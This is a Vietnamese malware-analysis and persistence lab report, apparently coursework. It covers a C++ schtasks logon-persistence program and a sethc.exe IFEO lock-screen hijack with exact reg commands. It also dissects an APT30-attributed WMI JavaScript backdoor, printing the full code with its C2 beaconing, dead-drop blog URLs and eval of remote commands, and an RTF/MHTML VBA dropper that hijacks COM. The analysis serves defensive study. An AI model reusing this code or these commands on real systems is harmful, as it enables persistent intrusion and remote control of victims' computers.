    wstring command =
        L"schtasks.exe /Create "
        L"/TN \"PersistenceLab\" "
        L"/SC ONLOGON "
        L"/TR \"\\\"" + wstring(self) + L"\\\"\" "
        L"/F";

    int result = _wsystem(command.c_str());

    return result == 0;
}

int main()
{
    bool result = hehe();

    if (result)
    {
        MessageBoxW(
            NULL,
            L"Hacked by kizapm!",
            L"hehe123",
            MB_OK | MB_ICONINFORMATION
        );
    }
    else
    {
        MessageBoxW(
            NULL,
            L"failed to hacked",
            L"hehe321",
            MB_OK | MB_ICONERROR
        );
    }

    return 0;
}
}

```

```

---

## 2.2. Kỹ thuật Image Hijack với sethc.exe (Sticky Keys) (10đ)

### 2.2.1. Bản chất cơ chế IFEO Debugger
Image File Execution Options (IFEO) nằm tại đường dẫn:
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`

Khi hệ điều hành Windows chuẩn bị tạo mới một tiến trình dựa trên tên tệp thực thi (ví dụ `sethc.exe`), tiến trình tạo sẽ kiểm tra xem trong nhánh IFEO có subkey nào trùng tên với tệp thực thi hay không. Nếu có subkey đó và chứa giá trị chuỗi `Debugger`:
- Windows sẽ **không** chạy tệp gốc.
- Thay vào đó, Windows sẽ thực thi tệp được khai báo trong giá trị `Debugger` và truyền tên tệp gốc làm tham số.

### 2.2.2. Các bước thiết lập Image Hijack cho `sethc.exe`
`sethc.exe` là tệp nhị phân hệ thống của tính năng Sticky Keys (Trợ năng ghim phím). Tệp này có đặc điểm đặc biệt: **có thể được gọi ngay tại màn hình đăng nhập (Lock screen / Logon screen) khi chưa có người dùng nào đăng nhập**.

#### Thực hiện qua Registry Command (Lab Environment):
Mở Command Prompt với quyền Quản trị viên (Administrator) và nhập lệnh:
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

Hoặc sử dụng tệp cấu hình `.reg`:
```reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe]
"Debugger"="C:\\Windows\\System32\\cmd.exe"
```

### 2.2.3. Thực nghiệm chứng minh: Kích hoạt Payload bằng 5 lần phím Shift
1. **Tại màn hình Desktop bình thường:**
   - Nhấn phím `Shift` liên tục 5 lần.
   - Bình thường Windows sẽ bật hộp thoại hỏi kích hoạt "Sticky Keys".
   - Sau khi thiết lập Hijack: Cửa sổ dòng lệnh `cmd.exe` lập tức mở ra thay vì hộp thoại Sticky Keys.
2. **Tại màn hình Khóa / Đăng nhập (Lock Screen - Win + L):**
   - Khóa máy tính bằng tổ hợp phím `Windows + L`.
   - Tại màn hình yêu cầu nhập mật khẩu (chưa hề đăng nhập), nhấn phím `Shift` liên tục 5 lần.
   - Cửa sổ `cmd.exe` lập tức xuất hiện ngay trên màn hình khóa.

## 3. Phân tích Chi tiết Mẫu 1: a.rar (`a.exe`)

## Phần 1: Phân tích Chi tiết Mẫu 1 — a.rar (`a.exe`)

### 1.1. Thông số Kỹ thuật, Metadata & Cấu trúc PE

* **Tên tệp lưu trữ:** `a.rar` $\rightarrow$ Tệp thực thi bên trong: `a.exe`
* **Kích thước:** 20,481 bytes
* **Kiến trúc:** PE32 (x86 32-bit Console/GUI, Subsystem: Windows GUI)
* **Thời gian biên dịch (TimeDateStamp):** `0x53EA244D` (Tue, 12 Aug 2014 14:01:17 UTC)
* **Mã băm mật mã:**
  * **MD5:** `bc45beb8b862d2136a070ae793685386`
  * **SHA1:** `d7021f32a4b273aa40a5b9717333dac9c2155e8a`
  * **SHA256:** `2fb960b07ee894043007a1f3be2ff985863c27be4bd9f50b3ddb735963e113b9`
  * **ImpHash:** `8812ff21aeb160e8800257140acae54b`
* **Nhận diện diệt virus:** `Trojan:Win32/Wacatac.B!ml`, `Backdoor.APT30.ProbeScript`

#### Cấu trúc Phân vùng (PE Sections)

| Phân vùng | Virtual Address (RVA) | Virtual Size | Size of Raw Data | Đặc tính (Characteristics) | Đánh giá |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `.text` | `0x1000` | `0x0fc3` (4,035 B) | `0x1000` (4,096 B) | `IMAGE_SCN_MEM_EXECUTE \| READ` | Chứa mã máy thực thi |
| `.rdata` | `0x2000` | `0x08f6` (2,294 B) | `0x1000` (4,096 B) | `IMAGE_SCN_MEM_READ` | Chứa IAT và hằng số chuỗi |
| `.data` | `0x3000` | `0x1640` (5,696 B) | `0x2000` (8,192 B) | `IMAGE_SCN_MEM_READ \| WRITE` | Chứa khối payload mã hóa |

#### Bảng hàm Nhập (Import Address Table - IAT)
* `KERNEL32.dll`: Các hàm can thiệp tệp và tiến trình (`GetSystemDirectoryA`, `CreateFileA`, `SetFileTime`, `DeleteFileA`, `OutputDebugStringA`, `InitializeCriticalSection`).
* `ole32.dll`: `CoInitialize`, `CoCreateInstance` (phục vụ khởi tạo engine kịch bản COM).
* `OLEAUT32.dll`: `SysAllocString`, `SysFreeString` (thao tác với kiểu dữ liệu BSTR trong COM).
* `MSVCRT.dll` & `MSVCP60.dll`: Các hàm C Runtime tiêu chuẩn.

---

### 1.2. Kỹ thuật Ngụy trang Hệ thống, Timestomping & Ghi Log

Sau khi khởi chạy, `a.exe` thực hiện chuỗi hành vi thiết lập địa bàn hoạt động có độ ẩn nặc cao:

```
[Khởi chạy a.exe]
       |
       v
GetSystemDirectoryA()  --> Lấy đường dẫn C:\Windows\system32
       |
       v
CopyFileA()            --> Sao chép vào C:\Windows\system32\Instell.exe
       |
       v
SetFileTime()          --> Timestomping: Đổi ngày giờ tạo/sửa đổi trùng file gốc
       |
       v
CreateFileA()          --> Mở/tạo C:\Windows\system32\httpcom.log để ghi nhật ký
```

1. **Sao chép ngụy trang tên tệp (Typosquatting):**
   * Lấy đường dẫn hệ thống qua `GetSystemDirectoryA`.
   * Sao chép chính nó thành `C:\Windows\system32\Instell.exe`.
   * *Đánh giá chiến thuật:* Kẻ tấn công cố ý viết sai chính tả từ `Install` thành `Instell`. Khi người quản trị kiểm tra lướt danh sách tiến trình trong Task Manager hoặc thư mục System32, cái tên này rất dễ bị bỏ qua vì trông giống một tiện ích cài đặt hệ thống thông thường.
2. **Kỹ thuật Timestomping (Xóa dấu vết thời gian):**
   * Mã độc sử dụng API `CreateFileA` mở một tệp hệ thống có sẵn trong System32 (ví dụ `cmd.exe` hoặc `kernel32.dll`) để lấy thông tin thời gian thông qua `GetFileTime`.
   * Sau đó, nó áp dụng các mốc thời gian này lên tệp `Instell.exe` vừa tạo thông qua API `SetFileTime`.
   * *Mục đích:* Vô hiệu hóa tính năng sắp xếp theo "Date Modified" của Windows Explorer và các công cụ giám sát Forensics khi săn tìm tệp mới xuất hiện trên hệ thống.
3. **Ghi nhật ký hoạt động ngầm (Log File):**
   * Đường dẫn: `C:\Windows\system32\httpcom.log`.
   * Định dạng bản ghi: `[%s] - %s\r\n`. Tệp này ghi nhận lại trạng thái thực thi các câu lệnh JavaScript và các lượt gửi tin HTTP.

---

### 1.3. Cơ chế Giải mã Động trong Bộ nhớ (In-Memory XOR Decryption)

Tại hàm bắt đầu từ RVA `0x1000` (địa chỉ ảo `0x00401000`), mã độc thiết lập một vòng lặp giải mã khối dữ liệu nhị phân nằm trong section `.data`:

```asm
0x00401018: mov ecx, dword ptr [ebp - 8]       ; i (vị trí biến đếm)
0x0040101b: cmp ecx, dword ptr [0x00403024]   ; So sánh với độ dài (4,986 bytes)
0x00401021: jae 0x0040105f                    ; Nếu đã xong -> thoát vòng lặp
0x00401023: mov edx, dword ptr [ebp - 8]
0x00401026: movsx eax, byte ptr [edx + 0x403028] ; Đọc byte mã hóa tại buffer
0x0040102d: xor ecx, ecx
0x0040102f: mov cl, byte ptr [0x00403021]     ; Đọc khóa XOR 1 (0x63)
0x00401035: xor eax, ecx                      ; Byte ^ 0x63
0x00401037: mov edx, dword ptr [ebp - 8]
0x0040103a: mov byte ptr [edx + 0x403028], al
0x00401040: mov eax, dword ptr [ebp - 8]
0x00401043: movsx ecx, byte ptr [eax + 0x403028]
0x0040104a: xor edx, edx
0x0040104c: mov dl, byte ptr [0x00403020]     ; Đọc khóa XOR 2 (0xe9)
0x00401052: xor ecx, edx                      ; Byte ^ 0xe9
0x00401054: mov eax, dword ptr [ebp - 8]
0x00401057: mov byte ptr [eax + 0x403028], cl ; Ghi lại byte đã giải mã
0x0040105d: jmp 0x0040100f                    ; Lặp tiếp (i++)
```

* **Địa chỉ vùng nhớ mã hóa:** `0x00403028`
* **Độ dài dữ liệu:** Đọc từ DWORD tại `0x00403024` $\rightarrow$ Giá trị: `0x137A` (**4,986 bytes**)
* **Cặp khóa byte:**
  * Khóa 1 (tại `0x00403021`): `0x63`
  * Khóa 2 (tại `0x00403020`): `0xE9`
* **Công thức toán học tương đương:** `Plaintext[i] = Ciphertext[i] ^ 0x63 ^ 0xE9 = Ciphertext[i] ^ 0x8A`

Sau khi hoàn tất giải mã, bộ nhớ tại `0x00403028` xuất hiện một đoạn mã JavaScript hoàn chỉnh. Ngay sau đó, mã độc gọi `CoInitialize` và `CoCreateInstance` với CLSID `{0E59F1D5-1FBE-11D0-8FF2-00A0D10038BC}` (`CLSID_IActiveScript`) để nạp engine `JavaScript`, truyền trực tiếp chuỗi script vừa giải mã vào để thực thi trong không gian nhớ.

---

### 1.4. Thiết lập Bám trụ Không Cần File (Fileless WMI Event Subscription Persistence)

Khi đoạn mã JavaScript thực thi, nó không ghi bất kỳ giá trị nào vào Registry Run key thông thường mà sử dụng cơ chế **WMI Event Consumer** của hệ điều hành Windows để đạt được quyền tồn tại vĩnh viễn (Fileless Persistence):

```javascript
// 1. Khởi tạo ActiveScriptEventConsumer độc hại
var n = "winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription",
    r = GetObject(n + ":ActiveScriptEventConsumer").spawninstance_();
r.name = "ProbeScriptFint"; 
r.scriptingengine = "javascript"; 
r.ScriptText = t + "..."; // Chứa toàn bộ logic backdoor
var i = r.Put_();

// 2. Thiết lập bộ đếm thời gian kích hoạt (Interval Timer)
r = GetObject(n + ":__IntervalTimerInstruction").spawninstance_();
r.Timerid = "ProbeScriptFint"; 
r.IntervalBetweenEvents = 6e3; // 6,000 miligiây = mỗi 6 giây kích hoạt một lần
r.Put_();

// 3. Thiết lập Event Filter lắng nghe sự kiện Timer
r = GetObject(n + ":__EventFilter").spawninstance_();
r.name = "ProbeScriptFint"; 
r.Query = 'select * from __timerevent where timerid="ProbeScriptFint"'; 
r.QueryLanguage = "WQL";
var s = r.Put_();

// 4. Ràng buộc Filter với Consumer (FilterToConsumerBinding)
r = GetObject(n + ":__FilterToConsumerBinding").SpawnInstance_();
r.Consumer = i.path; 
r.Filter = s.path; 
r.Put_();
```

#### Phân tích Cơ chế Bám trụ:
1. **Đối tượng thực thi:** Khi Timer phát tín hiệu mỗi 6 giây, tiến trình hệ thống `scrcons.exe` (WMI Standard Event Consumer Script Host) sẽ được Windows tự động triệu gọi để nạp và thực thi đoạn script lưu trong kho lưu trữ WMI Repository (`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`).
2. **Đặc tính Fileless:** Đoạn mã backdoor nằm hoàn toàn bên trong cơ sở dữ liệu WMI, không tồn tại dưới dạng một file `.js` độc lập trên ổ cứng. Ngay cả khi người dùng xóa file `a.exe`, backdoor vẫn tiếp tục hoạt động đều đặn mỗi 6 giây sau mỗi lần khởi động máy.

---

### 1.5. Kênh Điều khiển C2 Dead-Drop Resolver qua Blog RSS

Điểm đặc trưng của các nhóm APT (như APT30) là tránh nhúng cứng IP hoặc domain C2 vào mã nhị phân nhằm đối phó với việc bị đưa vào danh sách đen (Blacklisting). Thay vào đó, mã độc áp dụng kỹ thuật **Dead-Drop Resolver**:

```
[ProbeScriptFint (Mỗi 6s)]
           |
           v
GET các RSS Feed Blog hợp pháp (sosblogs, rediff, blogster)
           |
           v
Tìm kiếm thẻ tiêu đề: <title>@(Chuỗi_Mã_Hóa)@</title>
           |
           v
Giải mã bằng thuật toán dịch vòng tròn: circleDecode()
           |
           v
Thu được URL C2 thực tế (ví dụ: http://c2-server/gateway.php)
           |
           v
Gửi HTTP POST dữ liệu trinh sát (Reconnaissance)
           |
           v
Nhận phản hồi trong thẻ <div id="0a552b5a4352"> --> eval(Decode())
```

#### Danh sách Nguồn Dead-Drop RSS:
* `http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm`
* `http://blogs.rediff.com/anilchopra/feed/`
* `http://www.blogster.com/kapoorsunil09/profile/rss`

#### Thuật toán Giải mã URL C2 (`circleDecode`):
Hàm bóc tách chuỗi nằm giữa hai ký tự `@` trong thẻ tiêu đề RSS `<title>@(...)@</title>` và áp dụng phép biến đổi dịch vòng:
```javascript
circleDecode: function(sc) {
    var base = sc.charCodeAt(0);
    var s = base - 32;
    var r = '';
    for (var i = 1; i < sc.length; i++) {
        var nc = sc.charCodeAt(i) - s - i + 1;
        if (nc < 32) {
            nc = 126 + (nc - 32) % 94;
        }
        r += String.fromCharCode(nc);
    }
    return r;
}
```

#### Giao thức Trinh sát (Victim Profiling):
Mã độc thu thập toàn diện thông tin hệ thống nạn nhân thông qua WMI và đóng gói thành tham số POST:
```text
cstype=server&authname=servername&authpass=serverpass&hostname=<CSName>&ostype=<Caption+SPMajor>&macaddr=<MAC>&owner=XDD&version=2.0.0&runtime=5000&t=<Phút_Giây>
```
* `version`: `2.0.0`
* `owner`: `XDD` (Định danh chiến dịch gián điệp của tác giả)
* `User-Agent` giả lập: `Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5`

#### Cơ chế Nhận và Thực thi Lệnh:
Mã độc bóc tách thẻ `<div id="0a552b5a4352">` từ phản hồi của máy chủ, giải mã payload bằng hàm `Decode` (đọc byte khóa đầu tiên làm key và XOR với từng phần tử cách nhau bởi dấu phẩy) rồi thực thi trực tiếp bằng `eval()`. Kết quả thực thi được mã hóa và gửi ngược lại C2 qua tham số `&command=result&commandresult=...`.

---

### 1.6. Toàn bộ Mã nguồn JavaScript Bóc tách & Chú giải Từng Khối Lệnh

Dưới đây là toàn bộ mã nguồn JavaScript đã được định dạng chuẩn từ nhị phân `a.exe`:

```javascript
/* =========================================================================
 * BÓC TÁCH MÃ NGUỒN PAYLOAD TỪ a.exe (APT30 WMI ACTIVE SCRIPT BACKDOOR)
 * ========================================================================= */

function e(e, t) {
    // 1. Tạo đối tượng Consumer bám trụ WMI
    var n = "winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription",
        r = GetObject(n + ":ActiveScriptEventConsumer").spawninstance_();
    r.name = "ProbeScriptFint";
    r.scriptingengine = "javascript";
    
    // Đưa toàn bộ mã logic của Backdoor vào thuộc tính ScriptText
    r.ScriptText = t + "var sOwner='" + e + "';\
    var MAIN = function() {\
        $ = this;\
        $.key = 'W';\
        $.sFeedUrl = sXmlUrl;\
        $.sOwner = sOwner;\
        $.sXmlUrl = '';\
        $.oHttp = null;\
        $.oShell = null;\
        $.oStream = null;\
        $.sHostName = null;\
        $.sOSType = null;\
        $.sMacAddress = null;\
        $.sURLParam = null;\
        $.version = '2.0.0';\
        $.runtime = 5000;\
        $.oWMI = null;\
        $._x = ActiveXObject;\
    };\
    MAIN.prototype = {\
        /* Khởi tạo các COM Object thiết yếu */\
        InitObjects: function() {\
            $.oWMI = GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2');\
            $.oShell = new $._x('WScript.Shell');\
            $.oStream = new $._x('ADODB.Stream');\
            $.GetOSInfo();\
            $.GetMacAddress();\
            $.GenerateUrlParam();\
        },\
        /* Truy vấn WMI tổng quát */\
        WMI: function(sql) {\
            return $.oWMI.ExecQuery(sql);\
        },\
        /* Thu thập phiên bản HĐH và Tên máy */\
        GetOSInfo: function() {\
            var e = new Enumerator($.WMI('Select * from Win32_OperatingSystem'));\
            if (!e.atEnd()) {\
                var item = e.item();\
                $.sOSType = item.Caption + item.ServicePackMajorVersion;\
                $.sHostName = item.CSName;\
            }\
        },\
        /* Thu thập địa chỉ MAC của Card mạng vật lý PCI đang hoạt động */\
        GetMacAddress: function() {\
            var e = new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\"%PCI%\\\" and NetConnectionStatus=2'));\
            if (!e.atEnd()) {\
                $.sMacAddress = e.item().MACAddress;\
            }\
        },\
        /* Đóng gói URL Parameter phục vụ Reconnaissance */\
        GenerateUrlParam: function() {\
            var time = new Date();\
            $.sURLParam = 'cstype=server&authname=servername&authpass=serverpass&hostname=' + $.sHostName + '&ostype=' + $.sOSType + '&macaddr=' + $.sMacAddress + '&owner=' + $.sOwner + '&version=' + $.version + '&runtime=' + $.runtime;\
            $.sURLParam += '&t=' + time.getMinutes() + time.getSeconds();\
        },\
        /* Dọn dẹp tiến trình scrcons.exe sau mỗi chu kỳ */\
        CleanObjects: function() {\
            $.oShell = null;\
            $.oStream = null;\
            var e = new Enumerator($.WMI('Select * from Win32_Process where Name=\\\"scrcons.exe\\\"'));\
            while (!e.atEnd()) {\
                e.item().terminate();\
                e.moveNext();\
            }\
        },\
        /* Giải mã chuỗi lệnh C2 gửi về (XOR với keycode đầu chuỗi) */\
        Decode: function(sourceStr) {\
            var keycode = sourceStr.charCodeAt(0);\
            var source = sourceStr.substr(1);\
            var vals = source.split(',');\
            var result = '';\
            for (var i = 0; i < vals.length; i++) {\
                result += String.fromCharCode(vals[i] ^ keycode);\
            }\
            return result;\
        },\
        /* Giải mã URL C2 từ tiêu đề Blog RSS */\
        circleDecode: function(sc) {\
            var base = sc.charCodeAt(0);\
            var s = base - 32;\
            var r = '';\
            for (var i = 1; i < sc.length; i++) {\
                var nc = sc.charCodeAt(i) - s - i + 1;\
                if (nc < 32) {\
                    nc = 126 + (nc - 32) % 94;\
                }\
                r += String.fromCharCode(nc);\
            }\
            return r;\
        },\
        /* Vòng lặp liên lạc C2 chính */\
        MainLoop: function() {\
            $.oHttp = new $._x('Microsoft.XmlHttp');\
            var feedUrlArry = $.sFeedUrl.split(';');\
            var start = new Date();\
            var oXml = new ActiveXObject('MSXML2.DOMDocument.3.0');\
            for (var n = 0; n < feedUrlArry.length; n++) {\
                var UrlList = new Array();\
                var URLnum = 0;\
                try {\
                    var tstr = feedUrlArry[n].match('http://.*?\\\\.php');\
                    if (tstr != null) {\
                        UrlList[URLnum++] = tstr;\
                    } else {\
                        /* Gửi GET request lấy bản tin RSS */\
                        $.oHttp.Open('GET', feedUrlArry[n], false);\
                        $.oHttp.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');\
                        $.oHttp.Send();\
                        var response = $.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g, '');\
                        var re = /<title>@(.*)@<\\/title>+/g;\
                        var titleList = response.match(re);\
                        for (var i = 0; i < titleList.length; i++) {\
                            try {\
                                oXml.loadXML(titleList[i]);\
                                var container = oXml.getElementsByTagName('title');\
                                var tmpstr = container[0].text.match('@(.*)@');\
                                UrlList[URLnum++] = $.circleDecode(tmpstr[1]);\
                            } catch (e) {}\
                        }\
                    }\
                    /* Duyệt qua các C2 URL đã giải mã */\
                    for (var Urlindex = 0; Urlindex < UrlList.length; Urlindex++) {\
                        $.sXmlUrl = UrlList[Urlindex];\
                        var runnum = 360;\
                        while (runnum-- > 0) {\
                            $.oHttp.Open('POST', $.sXmlUrl, false);\
                            $.oHttp.setRequestHeader('CONTENT-TYPE', 'application/x-www-form-urlencoded');\
                            $.oHttp.Send($.sURLParam);\
                            var response = $.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g, '');\
                            if (response.length > 0) {\
                                var commands = null;\
                                var container;\
                                try {\
                                    oXml.loadXML(response);\
                                    container = oXml.getElementsByTagName('div');\
                                    for (var i = 0; i < container.length; i++) {\
                                        if (container[i].getAttribute('id') == '0a552b5a4352') {\
                                            commands = eval('(' + container[i].text + ')').command;\
                                        }\
                                    }\
                                } catch (e) {}\
                                /* Thực thi các câu lệnh từ C2 */\
                                if (commands != null) {\
                                    var commandresult = '';\
                                    for (var i = 0; i < commands.length; i++) {\
                                        var result = 'no response';\
                                        try {\
                                            result = eval($.Decode(commands[i].value));\
                                        } catch (e) {}\
                                        if (i > 0) commandresult += ',';\
                                        commandresult += '\\'' + commands[i].id + '\\':\\'' + escape(result) + '\\'';\
                                    }\
                                    if (commandresult.length > 0) {\
                                        commandresult = '{' + commandresult + '}';\
                                        $.oHttp.Open('POST', $.sXmlUrl, false);\
                                        $.oHttp.setRequestHeader('CONTENT-TYPE', 'application/x-www-form-urlencoded');\
                                        $.oHttp.Send($.sURLParam + '&command=result&commandresult=' + commandresult);\
                                    }\
                                } else {\
                                    $.sXmlUrl = '';\
                                    runnum = 0;\
                                }\
                            }\
                            $.runtime = (new Date()).getTime() - start.getTime();\
                            WScript.Sleep(10000);\
                        }\
                        if ($.sXmlUrl.length > 0) return;\
                    }\
                } catch (e) {}\
            }\
        },\
        Fire: function() {\
            $.InitObjects();\
            try { $.MainLoop(); } catch (e) {}\
            $.CleanObjects();\
        }\
    };\
    new MAIN().Fire();";

    // 2. Ghi Consumer vào WMI
    var i = r.Put_();

    // 3. Tạo Timer định kỳ 6,000 ms (6s)
    r = GetObject(n + ":__IntervalTimerInstruction").spawninstance_();
    r.Timerid = "ProbeScriptFint";
    r.IntervalBetweenEvents = 6e3;
    r.Put_();

    // 4. Tạo EventFilter
    r = GetObject(n + ":__EventFilter").spawninstance_();
    r.name = "ProbeScriptFint";
    r.Query = 'select * from __timerevent where timerid="ProbeScriptFint"';
    r.QueryLanguage = "WQL";
    var s = r.Put_();

    // 5. Ràng buộc Filter với Consumer
    r = GetObject(n + ":__FilterToConsumerBinding").SpawnInstance_();
    r.Consumer = i.path;
    r.Filter = s.path;
    r.Put_();
    return "";
}

// Gọi thực thi với Campain ID = 'XDD' và danh sách Dead-Drop Blogs
e("XDD", 'var sXmlUrl="http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss";');
```

---

## Phần 2: Phân tích Chi tiết Mẫu 2 — b.rar (`malw.rtf`)

### 2.1. Cấu trúc Đa phần MHTML Polyglot & Ngụy trang Đuôi RTF

* **Tên tệp lưu trữ:** `b.rar` $\rightarrow$ Tệp bên trong: `malw.rtf`
* **Kích thước:** 949,986 bytes
* **Mã băm SHA256:** `61182036fd1e668ad818f64c351034344b54f92793b0dcc52045cb221f9bb2c2`
* **MD5:** `0a5a0c889fd8772da489a327d4fdd8d6`
* **Nhận diện diệt virus:** `Exploit:Win32/Wopebol.G2`, `Trojan.MHTML.Dropper`

#### Phân tích Cấu trúc MIME MHTML
Mặc dù mang phần mở rộng `.rtf` (Rich Text Format), tệp tin này **hoàn toàn không phải tệp RTF** (không bắt đầu bằng magic byte `{\rtf1`). Khi kiểm tra header thực tế:

```http
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----=_NextPart_01D495FF.1931A4F0"
```

Microsoft Word được thiết kế tương thích ngược cực kỳ mềm dẻo: khi người dùng nhấp đúp vào tệp `.rtf`, Word kiểm tra nội dung bên trong, nhận diện định dạng MIME Multipart và tự động kích hoạt module phân giải MHTML mà không đưa ra bất kỳ cảnh báo sai định dạng tệp nào.

#### Danh sách 8 Thành phần Bên trong (MHTML Parts):

| STT | Tên thành phần / Content-Location | Kích thước | Content-Type | Vai trò kỹ thuật |
| :---: | :--- | :--- | :--- | :--- |
| **0** | *MIME Root Header* | 359 B | `multipart/related` | Khai báo MIME boundary |
| **1** | `file:///C:/B1344472/nb2.htm` | 865,314 B | `text/html; charset="windows-1252"` | **Chứa bảng Table 1 lưu trữ nhị phân Base64** |
| **2** | `.../nb2_files/themedata.thmx` | 4,441 B | `application/vnd.ms-officetheme` | Theme hiển thị ngụy trang của Word |
| **3** | `.../nb2_files/colorschememapping.xml` | 502 B | `text/xml` | Bảng màu Word |
| **4** | `.../nb2_files/image001.png` | 71,388 B | `image/png` | Hình ảnh văn bản ngụy trang hiển thị |
| **5** | `.../nb2_files/editdata.mso` | 7,288 B | `application/x-mso` | **Gói ActiveMime nén chứa VBA Macro** |
| **6** | `.../nb2_files/filelist.xml` | 437 B | `text/xml; charset="utf-8"` | Danh sách tệp đính kèm |
| **7** | *MIME Trailer Boundary* | 19 B | `none` | Dấu kết thúc MIME `--boundary--` |

---

### 2.2. Bóc tách Macro VBA & Kỹ thuật Tấn công COM Hijacking

Tại phần số 5 (`editdata.mso`), tệp tin chứa cấu trúc OLE Document được nén bằng thuật toán zlib của định dạng **ActiveMime** (header `ActiveMime` tại offset 0, luồng zlib bắt đầu tại offset `0x32`). Khi giải nén, mã nguồn VBA được kích hoạt tự động qua sự kiện `Document_Open()`:

```visualbasic
Private Sub Document_Open()
    On Error Resume Next
    Dim sAppData As String
    sAppData = Environ("APPDATA")
    sAppData = sAppData & "\main_background.png"
    Dim myWS As Object, strPath
    Set myWS = CreateObject("WScript.Shell")
    Set fsoCheck = VBA.CreateObject("Scripting.FileSystemObject")
    Dim iCheck As Boolean
    iCheck = False
    
    ' Kiểm tra hệ thống có phải là WoW64 (HĐH 64-bit chạy Word 32-bit)
    #If Win64 Then
    #Else
        If (fsoCheck.FileExists("C:\Windows\SysWOW64\cmd.exe") = True) Then
            iCheck = True
        Else
            iCheck = False
        End If
    #End If
    
    ' Thực hiện COM Hijacking
    If iCheck = True Then
        Dim wsh As Object
        Set wsh = VBA.CreateObject("WScript.Shell")
        Dim waitOnReturn As Boolean: waitOnReturn = True
        Dim windowStyle As Integer: windowStyle = 0
        ' Ghi đè vào Registry View 64-bit bằng cmd reg add /reg:64
        wsh.Run "cmd.exe /S /C reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32 /ve /t REG_SZ /d " & sAppData & " /f /reg:64", windowStyle, waitOnReturn
    Else
        ' Ghi đè trực tiếp qua WScript.Shell cho môi trường 32-bit thuần túy
        If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\") = False Then
            myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\", "", "REG_SZ"
        End If
        If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32\") = False Then
            If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\") = False Then
                myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\", "", "REG_SZ"
            End If
            myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32\", sAppData, "REG_SZ"
        End If
    End If

    ' Trích xuất DLL nhị phân từ Table 1 trong văn bản và giải mã Base64
    Dim b As String, a As String
    Dim tableNew As Table
    Set tableNew = ActiveDocument.Tables(1)
    If (iCheck = True) Then
        ' Hệ 64-bit/WoW64: Lấy Cell(1, 1) chứa DLL x86
        a = tableNew.Cell(1, 1).Range.Text
        a = Left(a, Len(a) - 2)
        b = Base64Decode(a, sAppData)
    Else
        ' Hệ 32-bit: Lấy Cell(1, 2) chứa DLL x64
        a = tableNew.Cell(1, 2).Range.Text
        a = Left(a, Len(a) - 2)
        b = Base64Decode(a, sAppData)
    End If
End Sub
```

#### Phân tích Kỹ thuật COM Hijacking:
1. **Mục tiêu can thiệp:** Khóa Registry `InprocServer32` của đối tượng COM CLSID `{2DEA658F-54C1-4227-AF9B-260AB5FC3543}`.
2. **Cơ chế ưu tiên:** Trong Windows, khi một tiến trình yêu cầu khởi tạo COM CLSID, Windows sẽ tìm kiếm trong `HKEY_CURRENT_USER\Software\Classes\CLSID` **trước khi** tìm kiếm trong `HKEY_LOCAL_MACHINE\Software\Classes\CLSID`. Do đó, kẻ tấn công chỉ cần quyền User thông thường (không cần UAC bypass hay Admin) vẫn có thể cướp quyền điều khiển đối tượng COM.
3. **Ngụy trang đuôi tệp:** Tệp DLL được lưu với tên `%APPDATA%\main_background.png`. Khi Windows kích hoạt đối tượng COM này, hàm API `CoCreateInstance` sẽ gọi `LoadLibraryW("%APPDATA%\\main_background.png")`. Trình nạp PE của Windows chỉ quan tâm đến cấu trúc nhị phân (Magic byte `MZ`), hoàn toàn không quan tâm đến phần mở rộng `.png`.

---

### 2.3. Giải mã Nhị phân PE x86/x64 từ Bảng Dữ liệu Word Document

Trong phần `nb2.htm`, dữ liệu nhị phân của 2 thư viện DLL độc hại được kẻ tấn công giấu dưới dạng văn bản Base64 nằm trong các ô `<td>` của `Table 1` (được mã hóa dạng Quoted-Printable MIME):

```html
<table class=MsoNormalTable border=0 cellspacing=0 cellpadding=0 ...>
  <tr>
    <!-- Ô Cell 1: DLL x86 (WoW64) -->
    <td width=295 valign=top ...>
      <p class=MsoNormal><span>TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ...</span></p>
    </td>
    <!-- Ô Cell 2: DLL x64 -->
    <td width=295 valign=top ...>
      <p class=MsoNormal><span>TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ...</span></p>
    </td>
  </tr>
</table>
```

#### Thông số 2 Tệp DLL Bóc tách Được:

| Thuộc tính | Tệp DLL x86 (Cell 1 - Dành cho WoW64) | Tệp DLL x64 (Cell 2 - Dành cho x64 Native) |
| :--- | :--- | :--- |
